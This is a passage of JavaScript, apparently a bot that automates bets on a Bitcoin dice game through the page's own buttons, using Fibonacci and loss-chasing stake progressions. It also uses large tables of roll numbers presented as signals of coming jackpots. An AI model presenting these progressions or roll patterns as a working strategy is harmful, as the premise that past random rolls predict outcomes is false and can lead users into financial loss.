}, 1100, 5);
var blind = true;
var RABBIT = false;
PAYOUT_MP_MODE = false;
PAYOUT_MP_START = 2;
PAYOUT_MP_NUM_ADD = 0.00000001;
BONUS_MODE = false;
AutoRounds = parseFloat(document.getElementsByName('AutoRounds')[0].value);
AutoTime = parseFloat(document.getElementsByName('AutoTime')[0].value);
FIBONACCI = true;
AMBUSH_MODE = true;
AMBUSH_Amount = parseFloat(document.getElementsByName('AMBUSH_Amount')[0].value);
AMBUSH_BET = parseFloat(document.getElementsByName('AMBUSH_BET')[0].value);
BACCARAT_MODE = false;
BACCARAT_Set = document.getElementsByName("BACCARAT_Set")[0].value.split(',').map(Number);
BACCARAT_Payout = true;
FIBONACCI_Multiply = parseFloat(document.getElementsByName('FIBONACCI_Multiply')[0].value);
FIBONACCI_Payout = parseFloat(document.getElementsByName('FIBONACCI_Payout')[0].value);
EXTRA_Inverse_Bet_on_Won = true;
EXTRA_Bet_Change = false;
PAYOUT_From_Normal_Mode = false;
BET = parseFloat(document.getElementsByName('BET')[0].value);
Multiply_Stake_on_LOST = parseFloat(document.getElementsByName('Multiply_Stake_on_LOST')[0].value);
PAYOUT_Multiply_on_WIN_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_WIN_Stake')[0].value);
PAYOUT_Multiply_on_LOST_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_LOST_Stake')[0].value);
PAYOUT_Multiply_on_Danger_Stake = parseFloat(document.getElementsByName('PAYOUT_Multiply_on_Danger_Stake')[0].value);
PAYOUT_MAX = parseFloat(document.getElementsByName('PAYOUT_MAX')[0].value);
PAYOUT_MIN = parseFloat(document.getElementsByName('PAYOUT_MIN')[0].value);
PAYOUT_LOWEST = parseFloat(document.getElementsByName('PAYOUT_LOWEST')[0].value);
ALARM = parseFloat(document.getElementsByName('ALARM')[0].value);
STOPLOSS = parseFloat(document.getElementsByName('STOPLOSS')[0].value);
Reset_Lost_Stake_when = parseFloat(document.getElementsByName('Reset_Lost_Stake_when')[0].value);
Downgrade_Lost_Multiply_At = parseFloat(document.getElementsByName('Downgrade_Lost_Multiply_At')[0].value);
Alarm_Multiply = parseFloat(document.getElementsByName('Alarm_Multiply')[0].value);
USD = parseFloat(document.getElementsByName('USD')[0].value);
JackPot_Sensor = false;
STOP = 0;
document.getElementsByName("BACCARAT_Payout")[0].checked = true;
document.getElementsByName('AMBUSH_MODE')[0].checked = true;
if (document.getElementsByName('FIBONACCI_Start_Bet')[0].checked) {
    FCheckH = true
} else if (!document.getElementsByName('FIBONACCI_Start_Bet')[0].checked) {
    FCheckH = false
}
function MEO_Stop() {
    gsaudioC.play();
    STOP = 1
}
function MEO_Start() {
    gsaudioB.play();
    try {
        chimin(chimink, mcmemo, chimint)
    } catch (e) {}
    console.clear();
    document.getElementById('double_your_btc_stake').value = parseFloat(document.getElementsByName('BET')[0].value).toFixed(8);
    STOP = 0;
    i = 0;
    TimeStart = Math.round(new Date().getTime() / 1000);
    if (BONUS_MODE) {
        roundBalance = document.getElementById('bonus_account_balance').innerText.match(/(\d+\.\d+)/)[0]
    } else {
        roundBalance = document.getElementById('balance').innerText
    }
    balanceNow = [];
    balanceNow.push(roundBalance);
    RunBTCScript()
}
function MEO_Presets() {
    var FIB_Presets = document.getElementById("FIB_Presets").value;
    if (FIB_Presets == 'set1') {
        document.getElementsByName('FIBONACCI_Multiply')[0].value = 1.618;
        document.getElementsByName('FIBONACCI_Payout')[0].value = 3;
        document.getElementsByName('AMBUSH_MODE')[0].checked = true;
        document.getElementsByName('AMBUSH_Amount')[0].value = 5;
        AMBUSH_MODE = true
    }
    if (FIB_Presets == 'set2') {
        document.getElementsByName('FIBONACCI_Multiply')[0].value = 1.27;
        document.getElementsByName('FIBONACCI_Payout')[0].value = 5;
        document.getElementsByName('AMBUSH_MODE')[0].checked = true;
        document.getElementsByName('AMBUSH_Amount')[0].value = 8;
        AMBUSH_MODE = true
    }
    if (FIB_Presets == 'set3') {
        document.getElementsByName('FIBONACCI_Multiply')[0].value = 1.3;
        document.getElementsByName('FIBONACCI_Payout')[0].value = 7;
        document.getElementsByName('AMBUSH_MODE')[0].checked = true;
        document.getElementsByName('AMBUSH_Amount')[0].value = 12;
        AMBUSH_MODE = true
    }
    if (FIB_Presets == 'set4') {
        document.getElementsByName('FIBONACCI_Multiply')[0].value = 1.4;
        document.getElementsByName('FIBONACCI_Payout')[0].value = 3;
        document.getElementsByName('AMBUSH_MODE')[0].checked = true;
        document.getElementsByName('AMBUSH_Amount')[0].value = 3;
        AMBUSH_MODE = true
    }
}
if (BONUS_MODE) {
    roundBalance = document.getElementById('bonus_account_balance').innerText.match(/(\d+\.\d+)/)[0]
} else {
    roundBalance = document.getElementById('balance').innerText
}
balanceNow.push(roundBalance);
function checkLost() {
    if (BONUS_MODE) {
        currentProfit = document.getElementById('bonus_account_balance').innerText.match(/(\d+\.\d+)/)[0] - balanceNow[0]
    } else {
        currentProfit = document.getElementById('balance').innerText - balanceNow[0]
    }
    if (FIBONACCI) {
        Multiply_Stake_on_LOST = FIBONACCI_Multiply;
        Alarm_Multiply = FIBONACCI_Multiply;
        if (!PAYOUT_From_Normal_Mode) {
            PAYOUT_MAX = FIBONACCI_Payout;
            PAYOUT_MIN = FIBONACCI_Payout;
            PAYOUT_LOWEST = FIBONACCI_Payout
        }
    }
    parseRollHistory = document.getElementById('bet_history_table_rows').childNodes;
    lostColor = parseRollHistory[3].childNodes[0].childNodes[6].childNodes[0].color;
    payOutMulti = document.getElementById('double_your_btc_payout_multiplier').value * 1;
    dangerStake = parseFloat(document.getElementById('double_your_btc_stake').value).toFixed(8);
    stake = document.getElementById('double_your_btc_stake').value * 1;
    stake = BET;
    won = document.getElementById('double_your_btc_bet_win').innerHTML;
    if (won.match(/(\d+\.\d+)/) !== null) {
        won = won.match(/(\d+\.\d+)/)[0]
    } else {
        won = false
    }
    lost = document.getElementById('double_your_btc_bet_lose').innerHTML;
    if (lost.match(/(\d+\.\d+)/) !== null) {
        lost = lost.match(/(\d+\.\d+)/)[0]
    } else {
        lost = false
    }
    if (won && !lost) {
        if (dangerStake >= BET) {
            stake = BET
        }
    }
    if (lost && !won) {
        if (dangerStake >= Reset_Lost_Stake_when) {
            console.log('STAKE is TOO HIGH: ' + dangerStake + ', so we lose it. Cutting it down to minimum');
            stake = BET
        } else if (dangerStake >= Downgrade_Lost_Multiply_At) {
            stake = lost * Alarm_Multiply
        } else {
            stake = lost * Multiply_Stake_on_LOST
        }
    }
    if (won && !lost) {
        if (dangerStake <= PAYOUT_Multiply_on_WIN_Stake) {
            payOutMulti = PAYOUT_MAX.toFixed(3)
        } else if (dangerStake >= PAYOUT_Multiply_on_WIN_Stake) {
            payOutMulti = PAYOUT_LOWEST.toFixed(3)
        }
    }
    if (lost && !won) {
        if (dangerStake >= PAYOUT_Multiply_on_LOST_Stake) {
            payOutMulti = PAYOUT_MIN.toFixed(3)
        }
    }
    if (dangerStake >= PAYOUT_Multiply_on_Danger_Stake) {
        payOutMulti = PAYOUT_LOWEST.toFixed(3)
    }
    if (!won && !lost) {
        alert('Error. Roll 3 times manually and try again.');
        return
    }
    if (won && !lost) {
        lostCount = []
    }
    if (lost && !won) {
        lostCount.push(1)
    }
    if (AMBUSH_MODE) {
        if (lostCount.length < AMBUSH_Amount) {
            stake = AMBUSH_BET
        } else if (lostCount.length == AMBUSH_Amount) {
            stake = BET
        }
    }
    if (BACCARAT_SORT >= (BACCARAT_Set.length - 1)) {
        BACCARAT_SORT = 0
    }
    if (lost) {
        BACCARAT_SORT = BACCARAT_SORT + 1
    }
    if (won) {
        BACCARAT_SORT = 0
    }
    if (BACCARAT_MODE) {
        stake = 0.00000001 * BACCARAT_Set[BACCARAT_SORT]
    }
    if (BACCARAT_MODE && AMBUSH_MODE) {
        if (lostCount.length < AMBUSH_Amount) {
            stake = AMBUSH_BET
        } else if (lostCount.length == AMBUSH_Amount) {
            stake = 0.00000001 * BACCARAT_Set[BACCARAT_SORT]
        }
    }
    if (BACCARAT_Payout) {
        payOutMulti = BACCARAT_Set[BACCARAT_SORT].toFixed(3)
    }
    if (BACCARAT_Payout && AMBUSH_MODE) {
        payOutMulti = BACCARAT_Set[BACCARAT_SORT].toFixed(3)
    }
    if (PAYOUT_MP_MODE) {
        if (won && !lost) {
            payOutMulti = PAYOUT_MP_START
        } else if (lost && !won) {
            payOutMulti = payOutMulti + 1;
            stake = parseFloat(lost) + PAYOUT_MP_NUM_ADD
        }
    }
    if (document.getElementById('double_your_btc_error').style.display != 'none') {
        console.log('Something Wrong. Trying to bet with minimal settings');
        payOutMulti = 1.01;
        stake = 0.00000001;
        DoubleYourBTC('hi')
    }
    document.getElementById('double_your_btc_stake').value = parseFloat(stake).toFixed(8);
    document.getElementById('double_your_btc_payout_multiplier').value = payOutMulti;
    function shortRollName(x) {
        return x.charAt(0) + x.charAt(1) + x.charAt(2)
    }
    function pad_with_zeroes(number, length) {
        var my_string = '' + Math.floor(number);
        while (my_string.length < length) {
            my_string = '0' + my_string
        }
        return my_string
    }
    rollBefore = pad_with_zeroes(parseRollHistory[4].childNodes[0].childNodes[3].firstChild.data, 5);
    ROLL_A = shortRollName(pad_with_zeroes(parseRollHistory[3].childNodes[0].childNodes[3].firstChild.data, 5));
    ROLL_B = shortRollName(pad_with_zeroes(parseRollHistory[4].childNodes[0].childNodes[3].firstChild.data, 5));
    ROLL_C = shortRollName(pad_with_zeroes(parseRollHistory[5].childNodes[0].childNodes[3].firstChild.data, 5));
    ROLL_D = shortRollName(pad_with_zeroes(parseRollHistory[6].childNodes[0].childNodes[3].firstChild.data, 5));
    var jackpotComingArray = ['0', '8988', '8833', '5393', '6006', '1991', '2992', '3993', '4994', '5995', '6996', '7997', '8998', '8660', '8833', '6222', '9989', '9882', '8822', '5454', '4440', '4441', '4442', '4443', '4445', '4446', '4447', '4448', '4449', '333', '8806', '888', '777', '7474', '8484', '2727', '9969', '8853', '8848', '9999', '7777', '6666', '5555', '3333', '2222', '1111', '4444', '8228', '1000', '2000', '3000', '4000', '5000', '6000', '7000', '8000', '9000', '1881', '2882', '3883', '4884', '5885', '6886', '7887', '9889', '188', '288', '388', '488', '588', '688', '788', '888', '988', '133', '233', '333', '433', '533', '633', '733', '833', '933', '144', '244', '344', '444', '544', '644', '744', '844', '944', '155', '255', '355', '455', '555', '655', '755', '855', '955', '177', '277', '377', '477', '577', '677', '777', '877', '977', '1', '2', '3', '4', '5', '6', '7', '8', '9', '1331', '1332', '1333', '1334', '1335', '1336', '1337', '1338', '1339', '2331', '2332', '2333', '2334', '2335', '2336', '2337', '2338', '2339', '3331', '3332', '3334', '3335', '3336', '3337', '3338', '3339', '4331', '4332', '4333', '4334', '4335', '4336', '4337', '4338', '4339', '5331', '5332', '5333', '5334', '5335', '5336', '5337', '5338', '5339', '6331', '6332', '6333', '6334', '6335', '6336', '6337', '6338', '6339', '7331', '7332', '7333', '7334', '7335', '7336', '7337', '7338', '7339', '8331', '8332', '8333', '8334', '8335', '8336', '8337', '8338', '8339', '9331', '9332', '9333', '9334', '9335', '9336', '9337', '9338', '9339', '1330', '2330', '3330', '4330', '5330', '6330', '7330', '8330', '9330', '1818', '1828', '1838', '1848', '1858', '1868', '1878', '1888', '1898', '2808', '2818', '2828', '2838', '2848', '2858', '2868', '2878', '2888', '2898', '3808', '3818', '3828', '3838', '3848', '3858', '3868', '3878', '3888', '3898', '4808', '4818', '4828', '4838', '4848', '4858', '4868', '4878', '4888', '4898', '5808', '5818', '5828', '5838', '5848', '5858', '5868', '5878', '5888', '5898', '6808', '6818', '6828', '6838', '6848', '6858', '6868', '6878', '6888', '6898', '7808', '7818', '7828', '7838', '7848', '7858', '7868', '7878', '7888', '7898', '9808', '9818', '9828', '9838', '9848', '9858', '9868', '9878', '9888', '9898', '8808', '8818', '8828', '8838', '8848', '8858', '8868', '8878', '8898', '4004', '4005', '5363', '5566', '5600', '5838', '5949', '7220', '7171', '7272', '7373', '7575', '7676', '7878', '7879', '7717', '8111', '8363', '8440', '8855', '8980', '8989', '8995'];
    if (JackPot_Sensor) {
        if (jackpotComingArray.includes(parseRollHistory[3].childNodes[0].childNodes[3].firstChild.data)) {
            alert('POSSIBLE JACKPOT ZONE!\n400 ROLLS <<< WAS/CAN >>> 700 ROLLS')
        }
        if (parseRollHistory[3].childNodes[0].childNodes[3].firstChild.data == '8888') {
            alert('It was JACKPOT! Jackpot checkbox was ON right? :D')
        }
    }
    return
}
if (parseRollHistory[3].childNodes[0].childNodes[3].firstChild.data == '8888') {
    gsaudioE.play();
    console.log('It was JACKPOT! Jackpot checkbox was ON right? :D')
}
function selectWhatToClick() {
    vMD1 = document.getElementById('multiplier_first_digit').innerHTML;
    vMD2 = document.getElementById('multiplier_second_digit').innerHTML;
    vMD3 = document.getElementById('multiplier_third_digit').innerHTML;
    vMD4 = document.getElementById('multiplier_fourth_digit').innerHTML;
    vMD5 = document.getElementById('multiplier_fifth_digit').innerHTML;
    vLastRoll = vMD1 + vMD2 + vMD3 + vMD4 + vMD5;
    vLastRollABC = vMD1 + vMD2 + vMD3;
    if (FIBONACCI) {
        if (document.getElementsByName('FIBONACCI_Start_Bet')[0].checked) {
            FCheckH = true
        } else if (!document.getElementsByName('FIBONACCI_Start_Bet')[0].checked) {
            FCheckH = false
        }
        if (EXTRA_Bet_Change) {
            if (ROLL_B >= '053') {
                FCheckH = true
            } else if (ROLL_B <= '052') {
                FCheckH = false
            }
        }
        if (EXTRA_Inverse_Bet_on_Won) {
            if (won && FIBONACCI_Start_Bet == HI) {
                FCheckH = false
            }
            if (won && FIBONACCI_Start_Bet == LO) {
                FCheckH = true
            }
            if (lost && FIBONACCI_Start_Bet == HI) {
                FCheckH = true
            }
            if (lost && FIBONACCI_Start_Bet == LO) {
                FCheckH = false
            }
        }
        if (EXTRA_Inverse_Bet_on_Won && EXTRA_Bet_Change) {
            if (won && FIBONACCI_Start_Bet == HI) {
                FCheckH = false
            }
            if (won && FIBONACCI_Start_Bet == LO) {
                FCheckH = true
            }
        }
        if (RABBIT) {
            if (FCheckH) {
                DoubleYourBTC('hi')
            } else if (!FCheckH) {
                DoubleYourBTC('lo')
            }
        }
        if (FCheckH) {
            FIBONACCI_Start_Bet = HI;
            FIBONACCI_Start_Bet.click()
        } else if (!FCheckH) {
            FIBONACCI_Start_Bet = LO;
            FIBONACCI_Start_Bet.click()
        }
    }
    NextMinus = ['000', '001', '002', '003', '004', '005', '006', '007', '008', '009', '010', '011', '012', '013', '014', '015', '016', '017', '018', '019', '020', '021', '022', '023', '024', '025', '026', '027', '028', '029', '030', '031', '032', '033', '034', '035', '036', '037', '038', '039', '040', '041', '042', '043', '044', '045', '046', '047', '048', '049', '050', '051', '052', '053', '054', '055', '056', '057', '058', '059', '060', '061', '062', '063', '064', '065', '066', '067', '068', '069', '070', '071', '072', '073', '074', '075', '076', '077', '078', '079', '080', '081', '082', '083', '084', '085', '086', '087', '088', '089', '090', '091', '092', '093', '094', '095', '096', '097', '098', '099'];
    numNow = NextMinus.includes(vLastRollABC);
    function nonExclusiveClick() {
        return HI.click()
    }
    function nonExclusiveClickLO() {
        return LO.click()
    }
    var num_000 = ['004', '005', '006', '007', '009', '010', '014', '018', '020', '021', '023', '026', '030', '032', '033', '034', '036', '038', '040', '041', '045', '047', '052', '053', '055', '056', '060', '062', '063', '064', '065', '069', '070', '071', '074', '075', '076', '077', '078', '081', '082', '084', '088', '090', '095'];
    var num_001 = ['000', '003', '007', '008', '012', '014', '015', '017', '020', '021', '024', '025', '027', '028', '029', '030', '031', '034', '035', '036', '039', '041', '045', '046', '053', '055', '056', '058', '059', '061', '062', '064', '065', '067', '068', '069', '070', '072', '076', '077', '079', '080', '081', '082', '083', '089', '090', '091', '096', '098', '099'];
    var num_002 = ['003', '005', '006', '007', '008', '009', '010', '011', '012', '014', '015', '016', '023', '024', '029', '030', '031', '032', '039', '043', '045', '049', '050', '053', '055', '062', '070', '071', '073', '074', '075', '076', '077', '080', '081', '082', '083', '084', '085', '087', '088', '090', '091', '092', '094', '095', '096', '097', '099'];
    var num_003 = ['001', '002', '003', '005', '006', '007', '009', '011', '012', '013', '014', '017', '018', '019', '021', '023', '027', '028', '030', '031', '032', '035', '036', '037', '039', '047', '048', '049', '050', '054', '056', '058', '059', '066', '067', '068', '069', '071', '073', '075', '076', '078', '080', '082', '083', '085', '089', '093', '094', '096', '097', '099'];
    var num_004 = ['001', '002', '003', '004', '005', '010', '012', '014', '017', '018', '021', '022', '026', '027', '031', '034', '037', '039', '041', '044', '048', '049', '051', '054', '058', '060', '064', '065', '068', '069', '072', '073', '077', '079', '085', '086', '088', '090', '092', '094', '097', '099'];
    var num_005 = ['002', '004', '005', '007', '008', '010', '013', '014', '015', '016', '017', '019', '022', '023', '025', '026', '028', '030', '032', '033', '035', '036', '037', '038', '041', '045', '046', '050', '053', '054', '055', '057', '058', '059', '061', '063', '066', '068', '070', '073', '076', '078', '082', '084', '087', '091', '093', '094', '095', '097', '098', '099'];
    var num_006 = ['000', '004', '006', '008', '009', '012', '013', '014', '016', '017', '018', '019', '024', '025', '028', '030', '031', '032', '036', '037', '038', '039', '042', '044', '045', '047', '051', '052', '053', '055', '056', '062', '063', '064', '065', '066', '068', '070', '071', '072', '075', '078', '080', '081', '082', '083', '085', '086', '087', '088', '091', '093', '094', '095', '098'];
    var num_007 = ['000', '002', '004', '007', '009', '012', '014', '018', '019', '020', '022', '028', '030', '033', '035', '037', '038', '039', '041', '042', '044', '050', '051', '052', '057', '058', '060', '061', '062', '064', '065', '067', '071', '072', '073', '074', '075', '080', '083', '088', '089', '090', '091', '092', '093', '095', '096', '099'];
    var num_008 = ['001', '002', '003', '005', '007', '008', '009', '011', '014', '015', '016', '019', '022', '023', '026', '027', '030', '034', '035', '037', '038', '040', '041', '045', '047', '049', '054', '056', '057', '060', '061', '062', '064', '066', '067', '071', '074', '075', '078', '079', '080', '081', '082', '083', '088', '090', '091', '092', '093', '094', '097', '098', '099'];
    var num_009 = ['001', '003', '004', '005', '006', '008', '010', '012', '013', '016', '018', '024', '027', '028', '031', '035', '037', '041', '042', '044', '046', '047', '049', '050', '051', '052', '053', '054', '056', '058', '060', '061', '063', '064', '065', '066', '075', '077', '078', '082', '083', '084', '088', '091', '093', '098', '099'];
    var num_010 = ['000', '003', '004', '005', '008', '009', '010', '013', '014', '015', '019', '021', '023', '025', '026', '030', '033', '034', '035', '036', '037', '039', '042', '043', '045', '046', '048', '049', '050', '051', '056', '058', '060', '061', '064', '065', '070', '071', '072', '073', '074', '076', '077', '078', '079', '080', '082', '083', '085', '086', '088', '089', '093', '094', '096', '097', '098', '099'];
    var num_011 = ['002', '003', '004', '005', '006', '007', '009', '010', '012', '014', '017', '020', '023', '029', '030', '031', '033', '035', '036', '037', '041', '043', '046', '048', '052', '054', '055', '061', '063', '066', '067', '068', '072', '073', '077', '080', '082', '085', '086', '090', '091', '092', '094', '097'];
    var num_012 = ['000', '001', '005', '006', '007', '008', '011', '013', '014', '016', '017', '019', '020', '021', '022', '023', '024', '025', '027', '036', '037', '038', '039', '041', '045', '047', '051', '052', '055', '057', '058', '059', '062', '064', '066', '067', '069', '070', '071', '072', '073', '074', '075', '081', '083', '084', '085', '088', '089', '090', '091', '097', '098', '099'];
    var num_013 = ['000', '003', '004', '005', '006', '007', '009', '011', '012', '013', '017', '019', '021', '026', '027', '031', '033', '035', '039', '046', '047', '049', '053', '056', '057', '061', '062', '064', '065', '066', '067', '070', '073', '074', '076', '077', '081', '082', '083', '084', '085', '086', '087', '088', '089', '091', '094', '095', '096'];
    var num_014 = ['001', '002', '003', '005', '006', '007', '008', '010', '016', '020', '021', '022', '023', '024', '026', '028', '029', '030', '031', '033', '035', '037', '041', '042', '043', '044', '045', '046', '047', '052', '053', '056', '058', '065', '066', '069', '070', '072', '073', '074', '075', '077', '080', '086', '088', '094', '095', '096', '097', '098', '099'];
    var num_015 = ['000', '001', '003', '004', '005', '006', '007', '008', '010', '011', '013', '014', '017', '018', '019', '021', '026', '029', '030', '031', '032', '033', '035', '037', '038', '043', '044', '046', '047', '050', '051', '053', '056', '058', '060', '061', '063', '064', '069', '071', '072', '075', '077', '078', '079', '082', '083', '085', '090', '096', '099'];
    var num_016 = ['000', '003', '005', '006', '009', '013', '015', '016', '022', '023', '024', '026', '031', '032', '033', '034', '038', '039', '040', '042', '043', '044', '045', '046', '048', '050', '051', '052', '055', '060', '062', '063', '064', '066', '067', '068', '069', '070', '072', '073', '076', '077', '079', '080', '081', '082', '084', '085', '086', '088', '089', '090', '091', '094', '095', '096', '097'];
    var num_017 = ['000', '001', '005', '008', '009', '010', '012', '013', '014', '015', '016', '018', '019', '020', '021', '022', '023', '025', '027', '029', '030', '031', '037', '038', '039', '040', '041', '043', '044', '045', '051', '053', '056', '057', '058', '059', '060', '061', '063', '069', '070', '071', '072', '074', '076', '079', '083', '084', '088', '090', '091', '093', '095', '096', '098', '099'];
    var num_018 = ['003', '004', '005', '009', '010', '011', '015', '017', '021', '022', '023', '024', '025', '026', '030', '040', '043', '044', '045', '046', '047', '048', '050', '052', '053', '055', '059', '061', '063', '066', '067', '069', '070', '072', '073', '075', '076', '079', '080', '081', '082', '083', '086', '087', '088', '089', '091', '092', '093', '094', '095', '097', '099'];
    var num_019 = ['000', '001', '002', '003', '010', '011', '012', '014', '018', '019', '020', '021', '022', '026', '028', '029', '031', '037', '038', '039', '040', '041', '045', '047', '050', '051', '057', '060', '062', '064', '066', '067', '068', '069', '070', '075', '077', '081', '082', '083', '084', '086', '090', '092', '095', '096'];
    var num_020 = ['000', '001', '003', '004', '005', '007', '008', '009', '011', '013', '016', '017', '018', '019', '020', '022', '023', '024', '028', '029', '030', '031', '032', '034', '035', '041', '042', '044', '049', '051', '053', '055', '056', '057', '060', '062', '064', '065', '068', '069', '073', '075', '076', '077', '078', '079', '080', '081', '083', '085', '086', '087', '088', '089', '090', '093', '094', '095', '096', '097', '098', '099'];
    var num_021 = ['001', '002', '004', '007', '008', '010', '016', '018', '019', '021', '022', '024', '025', '026', '031', '033', '036', '038', '039', '040', '041', '042', '044', '046', '048', '049', '052', '053', '057', '058', '060', '061', '063', '064', '065', '066', '068', '070', '071', '073', '074', '075', '076', '077', '079', '084', '087', '089', '090', '091', '092', '095', '096', '099'];
    var num_022 = ['001', '006', '007', '011', '012', '018', '019', '022', '024', '026', '027', '029', '030', '033', '035', '038', '040', '041', '043', '044', '046', '047', '048', '049', '050', '053', '058', '059', '060', '061', '066', '070', '073', '074', '075', '078', '080', '081', '085', '087', '090', '091', '092', '093', '095', '096', '098'];
    var num_023 = ['000', '004', '005', '007', '008', '012', '016', '021', '023', '024', '026', '028', '029', '032', '034', '036', '038', '041', '044', '045', '046', '049', '050', '052', '053', '058', '060', '064', '066', '071', '072', '073', '074', '075', '077', '080', '081', '083', '084', '086', '088', '089', '090', '091', '092', '094'];
    var num_024 = ['003', '004', '005', '006', '009', '010', '013', '014', '015', '019', '021', '026', '028', '032', '033', '034', '038', '043', '045', '046', '049', '050', '052', '056', '058', '059', '061', '067', '069', '074', '078', '084', '085', '092', '096', '097', '098', '099'];
    var num_025 = ['001', '002', '005', '007', '008', '011', '016', '017', '022', '023', '024', '025', '027', '030', '031', '034', '036', '039', '040', '046', '049', '051', '052', '053', '054', '055', '056', '057', '059', '060', '061', '062', '063', '064', '065', '067', '069', '071', '072', '075', '079', '080', '082', '083', '084', '091', '092', '093', '094', '095', '096', '098'];
    var num_026 = ['002', '005', '006', '012', '014', '015', '018', '019', '020', '022', '026', '027', '030', '031', '032', '034', '035', '038', '040', '041', '042', '043', '044', '045', '046', '047', '050', '051', '052', '053', '055', '056', '057', '058', '059', '060', '062', '063', '064', '068', '072', '075', '076', '077', '078', '080', '081', '082', '083', '085', '086', '087', '091', '093', '094', '096', '097'];
    var num_027 = ['001', '002', '004', '005', '006', '007', '008', '009', '013', '016', '020', '025', '027', '029', '032', '035', '036', '037', '042', '047', '048', '049', '050', '051', '054', '055', '057', '062', '063', '065', '066', '067', '070', '071', '073', '078', '079', '080', '082', '085', '086', '089', '090', '091', '092', '093', '095', '098', '099'];
    var num_028 = ['000', '001', '002', '003', '005', '006', '009', '010', '012', '015', '016', '022', '023', '024', '026', '027', '028', '029', '031', '033', '041', '044', '047', '052', '053', '055', '057', '058', '059', '066', '067', '069', '070', '071', '073', '074', '076', '082', '083', '084', '085', '088', '091', '094', '099'];
    var num_029 = ['000', '001', '003', '008', '011', '012', '016', '017', '021', '023', '024', '025', '027', '034', '035', '036', '037', '040', '044', '046', '049', '050', '051', '056', '059', '063', '064', '077', '078', '079', '080', '083', '084', '085', '089', '093', '094', '095', '096', '099'];
    var num_030 = ['001', '002', '006', '007', '009', '013', '015', '016', '017', '018', '021', '022', '023', '024', '026', '027', '028', '030', '035', '037', '040', '047', '048', '050', '052', '053', '054', '056', '059', '060', '062', '064', '066', '067', '070', '073', '075', '076', '077', '079', '080', '081', '083', '085', '086', '087', '090', '093', '094', '096', '099'];
    var num_031 = ['003', '004', '006', '007', '008', '010', '012', '014', '015', '019', '024', '025', '027', '028', '030', '031', '034', '035', '038', '040', '041', '043', '044', '046', '048', '049', '056', '058', '060', '061', '062', '066', '067', '069', '070', '072', '074', '077', '078', '079', '080', '081', '082', '083', '085', '086', '089', '091', '093', '094', '095', '099'];
    var num_032 = ['000', '001', '002', '003', '005', '008', '010', '011', '013', '015', '016', '017', '018', '020', '022', '026', '031', '032', '033', '035', '036', '037', '038', '039', '041', '042', '043', '046', '047', '049', '051', '052', '053', '054', '057', '059', '060', '061', '062', '064', '065', '069', '071', '072', '074', '076', '077', '079', '080', '083', '086', '087', '088', '094', '095', '098'];
    var num_033 = ['001', '005', '006', '007', '008', '009', '010', '011', '013', '015', '016', '017', '018', '019', '021', '022', '023', '024', '028', '029', '030', '034', '035', '041', '042', '045', '047', '050', '051', '052', '053', '055', '060', '062', '063', '065', '067', '068', '071', '072', '073', '077', '079', '080', '081', '084', '085', '087', '090', '091', '092', '093', '094', '097', '099'];
    var num_034 = ['001', '002', '007', '016', '018', '019', '020', '021', '023', '025', '026', '027', '029', '031', '033', '034', '035', '038', '039', '040', '042', '043', '047', '048', '050', '051', '052', '053', '054', '055', '058', '061', '064', '066', '068', '073', '074', '077', '079', '081', '088', '093', '094', '097', '098'];
    var num_035 = ['001', '002', '003', '008', '012', '013', '014', '016', '020', '021', '024', '025', '029', '030', '031', '032', '034', '038', '039', '042', '043', '044', '045', '046', '047', '049', '050', '052', '054', '055', '058', '060', '061', '063', '065', '067', '068', '071', '074', '075', '078', '079', '080', '081', '082', '083', '085', '089', '091', '092', '093', '094', '097', '099'];
    var num_036 = ['000', '002', '003', '004', '005', '006', '007', '009', '010', '011', '012', '013', '015', '016', '018', '020', '021', '024', '027', '028', '031', '033', '034', '036', '037', '038', '039', '041', '043', '044', '045', '046', '047', '049', '050', '052', '054', '056', '057', '059', '060', '063', '067', '068', '069', '070', '072', '074', '078', '081', '082', '084', '086', '087', '088', '089', '090', '091', '092', '095', '099'];
    var num_037 = ['000', '002', '003', '004', '006', '007', '008', '009', '012', '014', '017', '018', '019', '021', '022', '023', '024', '025', '026', '028', '032', '033', '036', '041', '043', '044', '045', '052', '059', '060', '061', '062', '065', '066', '067', '076', '081', '082', '084', '085', '086', '090', '092', '093', '094', '095', '099'];
    var num_038 = ['001', '002', '004', '006', '007', '009', '011', '015', '017', '018', '022', '023', '024', '025', '030', '031', '034', '038', '042', '043', '047', '050', '052', '054', '058', '059', '060', '065', '066', '068', '069', '071', '074', '075', '077', '078', '079', '080', '081', '087', '088', '089', '090', '092', '095', '096', '099'];
    var num_039 = ['001', '002', '003', '008', '009', '011', '012', '017', '020', '021', '023', '027', '028', '029', '031', '034', '037', '041', '042', '043', '045', '046', '048', '049', '051', '052', '053', '056', '057', '059', '061', '063', '064', '065', '069', '070', '071', '073', '076', '077', '079', '080', '083', '086', '087', '088', '090', '091', '095', '096', '097', '098'];
    var num_040 = ['000', '002', '005', '007', '008', '014', '015', '016', '017', '020', '023', '025', '027', '029', '031', '032', '033', '036', '037', '040', '046', '050', '058', '063', '065', '068', '069', '072', '073', '074', '075', '076', '077', '079', '080', '086', '087', '090', '092', '093', '096', '099'];
    var num_041 = ['000', '001', '002', '004', '007', '008', '009', '010', '015', '016', '022', '024', '026', '027', '029', '034', '036', '037', '039', '040', '043', '048', '049', '051', '055', '057', '058', '062', '063', '065', '066', '067', '068', '069', '070', '071', '075', '076', '077', '078', '079', '081', '085', '088', '094', '096', '097', '099'];
    var num_042 = ['004', '005', '006', '007', '009', '010', '011', '014', '015', '016', '019', '021', '024', '028', '029', '030', '032', '033', '035', '036', '037', '038', '039', '040', '041', '042', '044', '050', '056', '057', '058', '059', '068', '069', '070', '072', '074', '076', '078', '082', '084', '085', '086', '087', '088', '090', '092', '093', '094', '096', '097', '098', '099'];
    var num_043 = ['002', '003', '006', '008', '009', '012', '016', '020', '021', '022', '023', '024', '025', '027', '030', '031', '032', '034', '035', '037', '038', '039', '041', '042', '044', '047', '048', '050', '051', '052', '054', '055', '056', '057', '058', '059', '060', '061', '062', '064', '065', '066', '068', '071', '072', '073', '074', '075', '080', '083', '085', '086', '088', '089', '090', '091', '094', '095', '096', '098', '099'];
    var num_044 = ['001', '002', '004', '006', '008', '010', '012', '013', '014', '017', '019', '020', '021', '023', '026', '030', '031', '033', '036', '040', '043', '046', '047', '048', '049', '051', '052', '053', '054', '058', '059', '066', '068', '070', '072', '077', '080', '081', '084', '087', '088', '090', '092', '094', '095', '096', '097', '099'];
